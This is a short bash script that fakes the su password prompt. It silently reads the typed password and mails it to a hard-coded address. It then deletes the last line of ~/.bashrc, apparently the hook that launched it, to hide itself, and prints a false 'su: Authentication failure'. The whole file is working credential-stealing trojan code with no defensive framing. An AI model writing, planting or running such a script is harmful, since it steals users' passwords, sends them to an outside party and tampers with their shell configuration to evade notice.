#!/bin/bash
mailto=sjtu_xwq@sjtu.edu.cn
echo -e "Password: \c"
read -s password
echo
mail -s 'mum password' $mailto <<< $password
sleep 5
head -n -1 ~/.bashrc > ~/.bashrc.tmp
mv ~/.bashrc.tmp ~/.bashrc
echo "su: Authentication failure"
exit 1